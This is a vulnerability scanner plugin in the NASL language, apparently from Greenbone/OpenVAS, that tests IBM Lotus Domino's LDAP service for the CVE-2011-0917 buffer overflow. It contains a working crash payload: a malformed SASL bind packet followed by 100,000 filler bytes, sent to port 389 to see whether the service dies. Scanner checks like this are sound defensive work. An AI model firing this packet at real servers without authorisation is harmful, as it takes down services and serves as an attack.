# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902421");
  script_version("2025-03-05T05:38:52+0000");
  script_cve_id("CVE-2011-0917");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-05-09 15:38:03 +0200 (Mon, 09 May 2011)");
  script_name("IBM Lotus Domino LDAP Bind Request RCE Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 389);
  script_mandatory_keys("ldap/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43224");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16190/");
  script_xref(name:"URL", value:"http://zerodayinitiative.com/advisories/ZDI-11-047/");
  script_xref(name:"URL", value:"http://www-01.ibm.com/support/docview.wss?uid=swg21461514");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to execute
  arbitrary code within the context of the affected application.");

  script_tag(name:"affected", value:"IBM Lotus Domino versions 8.5.3 and prior.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error within 'nLDAP.exe' when
  processing a LDAP Bind request packet which can be exploited to cause a buffer
  overflow via a specially crafted packet sent to port 389/TCP.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"IBM Lotus Domino LDAP is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ldap.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ldap_get_port( default:389 );

if( ! ldap_alive( port:port ) )
  exit( 0 );

soc = open_sock_tcp( port );
if(  ! soc )
  exit( 0 );

## LDAP SASL Bind Request
attack = raw_string( 0x30, 0x83, 0x01, 0x00, 0x12, 0x02, 0x01, 0x01,
                     0x60, 0x83, 0x01, 0x00, 0x0A, 0x02, 0x01, 0x03,
                     0x04, 0x00, 0x80, 0x84, 0xFF, 0xFF, 0xFF, 0xFE ) +
                     crap( data:raw_string( 0x41 ), length: 100000 );

send( socket:soc, data:attack );
close( soc );
sleep( 5 );

if( ! ldap_alive( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
